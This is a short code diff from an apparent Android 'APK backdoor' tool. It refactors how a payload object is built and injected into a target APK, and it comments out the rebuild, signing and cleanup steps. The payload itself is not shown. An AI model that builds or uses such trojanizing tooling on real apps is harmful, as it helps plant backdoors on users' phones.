@@ -87,7 +87,7 @@ def setup_args():
 
 def main():
     args = setup_args()
-    logging.basicConfig(level=args.verbosity, filename='apk_backdoor.log')
+    logging.basicConfig(level=args.verbosity, filename='apk_backdoor.log', filemode='w')
 
     utilities.clear_screen()
     print(Fore.RED + utilities.get_title(center=True) + Style.RESET_ALL)
@@ -102,24 +102,23 @@ def main():
             args.host = None
     print(('-' * 30).center(120))
 
-    payload = Payload(args.host, args.public_host)
-
     apk = Apk(args.apk)
+    payload = Payload(apk, args.host, args.public_host)
 
     print('[ ==== PAYLOAD INJECTION ==== ]'.center(120))
-    payload.inject(apk)
+    payload.inject()
     payload.delete()
 
     print('[ ==== TARGET FINALIZATION ==== ]'.center(120))
 
-    apk.build()
+    # apk.build()
 
-    apk.sign()
+    # apk.sign()
 
-    @phase("Removing target's APK decompilation's results")
-    def remove_decompiled():
-        apk.remove_decompiled()
+    # @phase("Removing target's APK decompilation's results")
+    # def remove_decompiled():
+    #     apk.remove_decompiled()
 
-    remove_decompiled()
+    # remove_decompiled()
 
     print()
